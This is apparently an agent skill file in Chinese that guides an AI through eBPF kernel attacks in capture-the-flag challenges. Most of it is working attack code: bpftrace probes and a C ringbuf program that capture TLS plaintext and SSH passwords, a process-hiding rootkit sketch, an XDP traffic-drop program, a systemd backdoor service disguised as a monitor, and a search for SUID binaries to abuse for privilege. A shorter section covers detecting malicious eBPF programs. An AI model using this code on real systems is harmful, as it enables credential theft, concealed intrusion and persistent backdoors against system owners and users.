---
name: ebpf
description: eBPF 内核级攻击与防御。覆盖 eBPF 程序加载与利用、内核级凭证收割（tracepoint/kprobe on SSL_read/write）、进程隐藏、网络流量拦截与篡改、rootkit 级持久化、eBPF 权限模型绕过。
---

# eBPF 内核级攻击

> 当题目涉及 Linux 内核利用、高级 rootkit、内核级后门、eBPF 程序滥用时使用。
> 需要 root 权限或 CAP_BPF/CAP_SYS_ADMIN 能力。
> 离线环境原则：只用本机已有工具（bpftool / python3 / gcc），禁止下载外部工具。

## eBPF 环境检查
```bash
# 检查内核是否支持 eBPF
cat /proc/config.gz 2>/dev/null | zcat | grep -i bpf
# 检查已加载的 eBPF 程序
bpftool prog list 2>/dev/null
# 检查 eBPF maps
bpftool map list 2>/dev/null
# 检查当前进程的 eBPF 附加
bpftool net list 2>/dev/null
# 检查内核版本（eBPF 功能随版本增强）
uname -r
# 检查 CAP_BPF 能力（5.8+ 内核引入）
cat /proc/self/status | grep -i cap
# 检查 lockdown 模式（限制 eBPF 使用）
cat /sys/kernel/security/lockdown 2>/dev/null
```

## eBPF 凭证收割（kprobe/tracepoint）
```bash
# 原理：挂载 kprobe 到 SSL_read/SSL_write / ssh 认证函数
# 捕获所有经过的明文凭证（TLS 解密后的数据）

# 用 bpftrace 快速验证（如果可用）
bpftrace -e '
uprobe:/usr/lib/x86_64-linux-gnu/libssl.so:SSL_write {
  printf("SSL_write: %s\n", str(arg1, arg2));
}
uprobe:/usr/lib/x86_64-linux-gnu/libssl.so:SSL_read {
  printf("SSL_read: %s\n", str(arg1, arg2));
}'

# 挂载到 ssh 认证（捕获 SSH 密码）
bpftrace -e '
uprobe:/lib/x86_64-linux-gnu/security/libpam.so.0:pam_authenticate {
  printf("PAM auth attempt\n");
}
uprobe:/usr/sbin/sshd:auth_password {
  printf("SSH password: %s\n", str(arg0));
}'

# 用 C 编写 eBPF 程序（更持久）
cat > /tmp/cred_sniff.c << 'EOF'
#include <linux/bpf.h>
#include <bpf/bpf_helpers.h>

struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 256 * 1024);
} events SEC(".maps");

struct event {
    char data[256];
    int len;
};

SEC("uprobe/SSL_write")
int sniff_ssl_write(struct pt_regs *ctx) {
    struct event *e = bpf_ringbuf_reserve(&events, sizeof(*e), 0);
    if (!e) return 0;
    bpf_probe_read_user(e->data, sizeof(e->data), (void *)PT_REGS_PARM2(ctx));
    e->len = PT_REGS_PARM3(ctx);
    bpf_ringbuf_submit(e, 0);
    return 0;
}

char LICENSE[] SEC("license") = "GPL";
EOF
# 编译并加载
clang -O2 -target bpf -c /tmp/cred_sniff.c -o /tmp/cred_sniff.o
bpftool prog load /tmp/cred_sniff.o /sys/fs/bpf/cred_sniff
```

## eBPF 进程隐藏（Rootkit）
```bash
# 原理：hook getdents64 系统调用 → 过滤特定 PID/文件名的目录项
# 让 ps / ls / /proc 看不到目标进程

# bpftrace 概念验证（隐藏 PID）
bpftrace -e '
tracepoint:syscalls:sys_enter_getdents64 {
  @target_pid = 1337;  // 要隐藏的 PID
}
kretprobe:filldir64 {
  if (pid == @target_pid) {
    // 修改返回值，跳过此目录项
    printf("Hiding PID from getdents\n");
  }
}'

# 隐藏文件（特定名称）
# hook getdents64 → 遍历返回的 dirent 结构 → 跳过匹配项
# 这对 ls / find / /proc/PID 都有效（内核级过滤）

# 隐藏网络连接
# hook /proc/net/tcp 的读取 → 过滤特定端口
```

## eBPF 网络流量拦截与篡改
```bash
# 原理：XDP (eXpress Data Path) 或 TC (Traffic Control) 挂载点
# 在数据包进入网络栈之前拦截/修改/丢弃

# XDP 丢弃特定端口的流量（防火墙绕过）
cat > /tmp/xdp_drop.c << 'EOF'
#include <linux/bpf.h>
#include <linux/if_ether.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <bpf/bpf_helpers.h>

SEC("xdp")
int xdp_drop_port(struct xdp_md *ctx) {
    void *data_end = (void *)(long)ctx->data_end;
    void *data = (void *)(long)ctx->data;
    struct ethhdr *eth = data;
    if ((void *)(eth + 1) > data_end) return XDP_PASS;
    if (eth->h_proto != __constant_htons(ETH_P_IP)) return XDP_PASS;
    struct iphdr *ip = (void *)(eth + 1);
    if ((void *)(ip + 1) > data_end) return XDP_PASS;
    if (ip->protocol != IPPROTO_TCP) return XDP_PASS;
    struct tcphdr *tcp = (void *)ip + (ip->ihl * 4);
    if ((void *)(tcp + 1) > data_end) return XDP_PASS;
    // 丢弃目标端口 8443 的流量
    if (tcp->dest == __constant_htons(8443)) return XDP_DROP;
    return XDP_PASS;
}
char LICENSE[] SEC("license") = "GPL";
EOF
# 加载到网卡
clang -O2 -target bpf -c /tmp/xdp_drop.c -o /tmp/xdp_drop.o
bpftool net attach xdp /tmp/xdp_drop.o dev eth0

# TC 层篡改数据包内容
# 修改 HTTP 响应 → 注入恶意内容
# 修改 DNS 响应 → 重定向域名到攻击者 IP
```

## eBPF 持久化（内核级后门）
```bash
# 原理：eBPF 程序在内核态运行 → 重启前消失
# 持久化方案：
# 1. 写入 systemd service → 开机自动加载 eBPF 程序
# 2. 写入 /etc/bpf/ 目录 + cron 定时加载
# 3. 修改内核模块加载脚本

# systemd 持久化
cat > /etc/systemd/system/bpf-backdoor.service << 'EOF'
[Unit]
Description=BPF Monitor
[Service]
ExecStart=/usr/sbin/bpftool prog load /opt/.bpf_prog.o /sys/fs/bpf/persist
Type=oneshot
RemainAfterExit=yes
[Install]
WantedBy=multi-user.target
EOF
systemctl enable bpf-backdoor

# eBPF map 持久化（数据跨程序重启保留）
# BPF_MAP_TYPE_HASH 在 pinned 模式下存活于 /sys/fs/bpf/
bpftool map create /sys/fs/bpf/persist_map type hash key 4 value 256 entries 1024 name persist
```

## eBPF 检测（发现恶意 eBPF 程序）
```bash
# 列出所有已加载的 eBPF 程序（检查未知程序）
bpftool prog list
# 重点关注：
#   - 类型为 kprobe/uprobe/tracepoint 的程序（可能在做凭证收割）
#   - 类型为 xdp/tc 的程序（可能在做流量操控）
#   - 没有对应已知工具名的程序

# 检查 eBPF map 内容（可能在存储窃取的数据）
bpftool map list
bpftool map dump id MAP_ID

# 检查哪些程序附加到了哪些 hook
bpftool net list           # XDP/TC 附加点
bpftool perf list          # perf event 附加点

# 检查 /sys/fs/bpf/ 下的 pinned 对象（持久化痕迹）
find /sys/fs/bpf/ -type f 2>/dev/null

# 检查 audit 日志中的 bpf() 系统调用
ausearch -sc bpf 2>/dev/null | tail -20
```

## eBPF 权限模型绕过
```bash
# CAP_BPF（5.8+）：独立的 eBPF 能力，比 CAP_SYS_ADMIN 更细粒度
# 检查进程能力
cat /proc/self/status | grep Cap
capsh --decode=$(cat /proc/self/status | grep CapEff | awk '{print $2}')

# unprivileged_bpf_disabled 检查
cat /proc/sys/kernel/unprivileged_bpf_disabled
# 0 = 非特权用户可加载 eBPF（极其危险）
# 1 = 需要特权（正常）

# 利用 SUID/capabilities 的二进制加载 eBPF
# 如果某 SUID 程序有 CAP_BPF → 可以用它加载恶意 eBPF 程序
getcap -r / 2>/dev/null | grep -i bpf
find / -perm -4000 2>/dev/null | while read f; do
  getcap "$f" 2>/dev/null | grep -q bpf && echo "VULN: $f"
done

# /proc/sys/kernel/perf_event_paranoid
# -1 = 允许非特权 perf/eBPF（可能被利用做凭证窃取）
cat /proc/sys/kernel/perf_event_paranoid
```

## 关键规则
- **需要 root 或 CAP_BPF**：eBPF 程序加载需要特权，先确认权限再尝试
- **bpftrace 快速验证**：如果 bpftrace 可用，先一行命令验证可行性
- **凭证收割最实用**：SSL_read/write kprobe 是 CTF 里最常见的 eBPF 攻击
- **检测也很重要**：如果题目是"发现后门"，重点检查 bpftool prog list
- **eBPF 不跨重启**：除非有持久化机制（systemd/pinned），重启后消失
- **flag 位置**：可能在被 eBPF 截获的流量中、内核内存、eBPF map 数据
